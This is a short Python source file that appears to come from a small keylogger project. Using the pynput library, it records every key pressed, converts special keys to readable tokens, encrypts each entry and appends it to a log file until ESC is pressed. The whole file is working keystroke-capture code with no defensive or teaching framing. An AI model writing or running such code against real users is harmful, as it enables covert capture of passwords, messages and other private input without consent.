# src/keylogger.py
from pynput.keyboard import Key, Listener
from src.utils.encryption import encrypt
from src.config import ENC_LOG_FILE
import os

# Ensure logs directory exists
os.makedirs(os.path.dirname(ENC_LOG_FILE), exist_ok=True)


def write_file(key):
    k = str(key).replace("'", "")
    if k == "Key.space":
        k = " "
    elif k == "Key.enter":
        k = "\n"
    elif k.startswith("Key."):
        k = f"[{k}]"

    encrypted_key = encrypt(k)
    with open(ENC_LOG_FILE, "a") as f:
        f.write(encrypted_key + "\n")


def on_press(key):
    write_file(key)


def on_release(key):
    if key == Key.esc:
        return False  # Stop on ESC


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
